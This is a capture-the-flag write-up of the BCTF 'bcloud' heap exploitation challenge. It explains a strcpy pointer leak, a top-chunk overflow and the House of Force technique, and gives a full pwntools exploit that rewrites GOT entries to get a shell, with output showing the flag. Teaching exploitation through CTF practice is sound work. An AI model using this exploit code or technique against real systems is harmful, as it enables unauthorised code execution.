---
layout: post
title: BCTF bcloud - Exploitation 150
category: [Exploitation]
tags: [Exploitation, BCTF]
comments: true
---

**Points:** 150
**Solves:** 30
**Category:** Exploitation
**Description:** nc 104.199.132.199 1970

> [bcloud]({{site.url}}/assets/bcloud)
> [libc-2.19.so]({{site.url}}/assets/libc-2.19.so)

If we start the binary we see it's a form of note keeping application.

{% highlight text %}
➜  pwn150 ./bcloud
Input your name:
uafio
Hey uafio! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!
Now let's set synchronization options.
Org:
DotHack//
Host:
http://uaf.io
OKay! Enjoy:)
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>

{% endhighlight %}

## Leaking the heap address

If we disassemble the "Input your name/Org/Host" functions we will notice the first vulnerability.

![image]({{site.url}}/assets/Screen_Shot_2016-03-20_at_9_16_22_PM.jpg)

At top arrow points to the local buffer of 0x40 bytes for the _name_. Exactly 0x40 bytes after it we see a space designed to store a pointer to a heap allocated chunk, for pernament store of the name. Later we see that the _name_ is copied from the local stack buffer to the allocated heap buffer. However as we know _strcpy_ terminates on null byte and if we fill the _name_ with exactly 0x40 bytes, the ptr to the heap buffer will get copied on to the heap as well. Right after that the _printWelcome()_ function will print the heap buffer, providing us with a leak of the heap address.

## The overflow

Now let's look at the way Org and Host are provided.

{% highlight C %}
int getOrgAndHost() {
    memset(bufferBase, 0x0, 0x90);

    // Store input for "Org" at bufferBase, size 0x40
    puts("Org:");
    take_input(bufferBase, 0x40, 0xa);

    // Store input for "Host" at bufferBase+0x44, size 0x40
    puts("Host:");
    take_input(bufferBase + 0x44, 0x40, 0xa);

    // Allocate two buffers
    *(bufferBase + 0x88) = malloc(0x40);
    *(bufferBase + 0x40) = malloc(0x40);
    *hostBuffer = *(bufferBase + 0x40);
    *orgBuffer = *(bufferBase + 0x88);

    // Copy input for "Host" to heap
    eax = *(bufferBase + 0x88);
    strcpy(eax, bufferBase + 0x44);

    // Copy input for "Org" to heap
    eax = *(bufferBase + 0x40);
    strcpy(eax, bufferBase);

    puts("OKay! Enjoy:)");
}
{% endhighlight %}

As you have probably figured out, we have the same bug here as well. The pointer for the Host's heap buffer is stored right between the local buffers of the Org and Host on the stack. By filling 0x40 bytes in the Host's local buffer we can cause strcpy to overwrite the Wilderness's chunk metadata on the heap.

## House of Force

Knowing that we control the Wilderness's metadata, we can use exploitation technique called House of Force. The way this technique works is by corrupting the size of the wilderness to some huge value and having a function that allows us to specify the size of heap allocated buffer. This way we can make malloc allocate a buffer that will eventually wrap around the address space available on 32bit system and reach the area we want to write data to (as we will see later, this would be a .bss address in this case). Once malloc has allocated a chunk so big that the end of it will reach the area we are going to write to, we need to call malloc again so we get a smaller chunk, right on top of our write target.

Fortunately we have a function that satisfies this _malloc(controlled_size)_ condition.

## Function Descriptions

So far we have only looked at the binary's welcome message and what we can gain/exploit via the _Name/Org/Host_ buffers.
Here we will see how we can use the binary's functionality to leverage these vulnerabilities.

After the _printWelcome()_ function we have a regular case/switch statement with 7 options.

{% highlight text %}
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
{% endhighlight %}

Show note, Syn and Quit are not important or just useless in our case. We are left with New note, Edit note and Delete note.

### New note

{% highlight C %}
void newNote() {
    for (counter = 0x0; counter <= 0x9; counter = counter + 0x1) {
            if (*(counter * 0x4 + 0x804b120) == 0x0) {
                break;
            }
    }
    if (counter == 0xa) {
            puts("Lack of space. Upgrade your account with just $100 :)");
    }
    else {
            puts("Input the length of the note content:");
            length = getChoice();
            *(counter * 0x4 + 0x804b120) = malloc(length + 0x4);
            if (*(counter * 0x4 + 0x804b120) == 0x0) {
                    exit(0xffffffff);
            }
            else {
                    *(counter * 0x4 + 0x804b0a0) = length;
                    puts("Input the content:");
                    eax = *(counter * 0x4 + 0x804b120);
                    take_input(eax, length, 0xa);
                    printf("Create success, the id is %d\n", counter);
                    *(counter * 0x4 + 0x804b0e0) = 0x0;
            }
    }
    return;
}
{% endhighlight %}

As you can tell, _newNote()_ uses malloc() with size that we control. It also stores the pointer to the allocated buffer in an integer array of 10 elements on the .bss - 0x804b120. It also stores the length of each buffer in another integer array of 10 elements on the .bss - 0x804b0a0.

### Edit Note.

{% highlight C %}
void editNote() {
    puts("Input the id:");
    choice = getChoice();
    if ((choice >= 0x0) && (choice <= 0x9)) {
            noteToEdit = *(choice * 0x4 + 0x804b120);
            if (noteToEdit == 0x0) {
                    puts("Note has been deleted.");
            }
            else {
                    len = *(choice * 0x4 + 0x804b0a0);
                    *(choice * 0x4 + 0x804b0e0) = 0x0;
                    puts("Input the new content:");
                    take_input(noteToEdit, len, 0xa);
                    puts("Edit success.");
            }
    }
    else {
            puts("Invalid ID.");
    }
    return;
}
{% endhighlight %}

The _editNote()_ function let's us edit the content of previously created note by requesting an index from the notes[10] array.
The length of the input data is taken from the lengths[10] array from the same index as the notes[10] on the .bss.

### deleteNote

{% highlight C %}
void deleteNote() {
    puts("Input the id:");
    choice = getChoice();
    if ((choice >= 0x0) && (choice <= 0x9)) {
            note = *(choice * 0x4 + 0x804b120);
            if (note == 0x0) {
                    puts("Note has been deleted.");
            }
            else {
                    *(choice * 0x4 + 0x804b120) = 0x0;
                    *(choice * 0x4 + 0x804b0a0) = 0x0;
                    free(note);
                    puts("Delete success.");
            }
    }
    else {
            puts("Invalid ID.");
    }
    return;
}
{% endhighlight %}

The _deleteNote()_ function uses _free(notes[index])_ and zeros the lengths[index] element only if the notes[index] contain an element.

## Plan

So far we have a leak of a ptr on the heap. We have an overflow to control the wilderness's size and we have a way to allocate huge chunks. You might be thinking, "Cool, we are just going to overwrite the GOT and we are done.". Yes, but let's not forget that ASLR is enabled and we only have an address of the heap.

So to exploit this,

1. I'm going to use House of Force to allocate a heap chunk that reaches the notes[] array on the .bss.
2. Allocate another chunk that stretches from the beginning of the lengths[] array at 0804b0a0 to the end of the notesp[] array @ 0x804b120 on the .BSS. This way we can control everything in those 2 arrays (and something in between that we don't care about).
3. Once we get control of the notes[] and lengths[] we can simply use _editNote()_ to write to the addresses we fill notes[] array with.

We do get a lot of writes what/where this way but we still haven't leaked a libc address.
To do that I'm doing to overwrite the _free@got_ with _printf@got_, this way we can use the _deleteNote()_ function with printf with controlled argument and leak whatever/whereever.

4. Replace _free@got_ with _free@got_.
5. Leak the _atoi@got_.
6. Replace _atoi_ with _system_.

Once function we haven't looked at is the _getChoice()_ function. This function is used pretty much everywhere, including in the main menu for the switch/case statement.

{% highlight C %}
int getChoice() {
 
    take_input(buffer, 0x10, 0xa);
    eax = atoi(buffer);
 
    return eax;
}
{% endhighlight %}

As you can see, _atoi()_ here is pretty handy for exchanging with _system()_.

## Final script

{% highlight python %}
#!/usr/bin/env python

# @uaf.io
# flag: BCTF{3asy_h0uSe_oooof_f0rce}

from pwn import *
import sys, struct, time

r = remote('104.199.132.199', 1970)
#r = process(['./bcloud.9a3bd1d30276b501a51ac8931b3e43c4'])
#print util.proc.pidof(r)
#sys.stdin.read(1)

# Send name and leak the heap buffer
r.send("A" * 0x3c + "ZZZZ")
garbage = r.recvuntil("ZZZZ")
leak = u32(r.recv(4))
garbage = r.recv()
log.info("Leak: " + hex(leak))

# Send Host and Org to overflow the wilderness
HOST = "B" * 0x40
wilderness = "\xff\xff\xff\xff"
r.send(HOST)
r.sendline(wilderness)
garbage = r.recv()

# Plan - step 1: Request a chunk to reach the BSS
r.sendline('1')
bss = 0x804b0a0

size = (0xffffffff - leak - 224) + bss - 4
log.info("Size: " + hex(size))
size = (0xffffffff ^ size) + 1
r.sendline("-" + str(size))

# Plan - step 2: Allocate another chunk on top of BSS
atoi = 0x804b03c
free = 0x804b014
r.sendline('1')
r.sendline('172')

# Plan - step 3: Fill out the lengths[] and notes[] arrays
# with pre-defined values of sizes and GOT addresses
payload = p32(4)
payload += p32(4)
payload += p32(4)
payload += p32(0) * 29
payload += p32(atoi)
payload += p32(free)
payload += p32(atoi)
payload += p32(0) * 8

r.send(payload)
garbage = r.recv()

# Plan - step 4: Change free to printf
printf = 0x80484d0
r.sendline('3')
r.sendline('1')
r.send(p32(printf))
garbage = r.recv()

# Plan - step 5: Leak atoi@got
r.sendline('4')
r.sendline('0')

garbage = r.recvuntil("Input the id:\n")
garbage = r.recvuntil("Input the id:\n", timeout=1)

atoi = u32(r.recv(4))
log.info("Atoi: " + hex(atoi))
garbage = r.recv()

# Plan - step 6: Change atoi to system
system = atoi + 0xe930
r.sendline('3')
r.sendline('2')
r.send(p32(system))
garbage = r.recv()

# Use the menu to call system
r.sendline("/bin/sh\x00")

r.interactive()

{% endhighlight %}

{% highlight text %}
➜  pwn150 python ./exploit.py
[+] Opening connection to 104.199.132.199 on port 1970: Done
[*] Leak: 0x8f2d008
[*] Size: 0xff11dfb3
[*] Atoi: 0xf761c860
[*] Switching to interactive mode
$ cat /tmp/flag
BCTF{3asy_h0uSe_oooof_f0rce}
$
{% endhighlight %}


